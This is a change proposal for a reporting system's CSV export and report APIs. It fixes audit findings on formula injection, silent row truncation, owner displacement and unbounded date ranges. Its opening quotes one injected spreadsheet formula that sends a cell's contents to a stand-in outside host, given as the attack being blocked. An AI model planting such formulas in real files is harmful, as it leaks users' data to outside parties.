# Proposal

## Why

A process owner opens a saved report's CSV in a spreadsheet. A participant typed
`=HYPERLINK("https://x.example/?"&B2;"Details")` into a text field. The
spreadsheet evaluates that formula on the owner's machine. The same report stops
at 50 rows, and the CSV does not say so. An editor can displace a report's
owner. One request with a 130-year range loads every instance into memory and
reads the history twice. The 2026-10-10 audit found all four (C-4 = D-2, C-5,
C-13, C-19).

## What Changes

- **C-4:** `reportResultToCsv` prefixes `'` to the text of a string or list value
  cell. The text starts with `=`, `+`, `-`, `@`, a tab or a carriage return. A number
  keeps its sign. The header row and the three empty-cell markers stay as they
  are. The JSON execution stays as it is.
- **C-5:** A report executes with its own row limit, `REPORT_ROW_LIMIT` = 1000.
  It ran with the default 50 before. `queryInstances` takes an optional
  `maxLimit` that raises its enforced maximum for one caller. No HTTP route
  passes it, so every other reader keeps 200. A truncated CSV ends with the line
  `(truncated: first 1000 rows only)`. The table already shows its own note.
- **C-13:** `updateReport` rejects a new owner who is not in the report's
  current editors. It also rejects a request that drops the current owner from
  the editors, unless the current owner sends it.
- **C-19:** The cycle-time, bottleneck and SLA views read the history once. A
  range with more than 20000 instances answers `400` and runs no aggregate. The
  change does not add a span limit. It returns no partial result.

The change touches no schema and no definition contract rule. The truncation
note exists already. The 400 reaches the screens as the request-shape note,
and its text blames the request. That wording misleads here. The note gains
one sentence in English and German that says to narrow the date range.

## Capabilities

### New Capabilities

None.

### Modified Capabilities

- `reporting-data-tables`: the CSV neutralizes a formula-leading string cell,
  and states a truncated result. The CSV and the JSON execution keep one row
  and column set.
- `instance-data-tables`: a report patch cannot displace the owner, and a
  report execution uses the report row limit.
- `instance-data-query`: a caller can raise the enforced maximum for itself
  with `maxLimit`.
- `reporting-analytics-api`: a range above the instance cap answers `400`.
- `reporting-app`: the request-shape note tells the reader to narrow the date
  range.

## Impact

- `src/runtime/reports.ts`, `src/runtime/queries.ts`,
  `src/engine/reporting.ts`, `src/http/reporting-routes.ts`.
- `packages/web/src/i18n/catalogs/reporting.ts`, one string in each locale.
- `docs/openapi.yaml` excludes `reporting/*`, so it stays as it is.
- `docs/decisions.md`: the archive commit strikes the change's entry in the
  audit index.
- Tests: the `test/` suites for reports, CSV, report patch and reporting views.
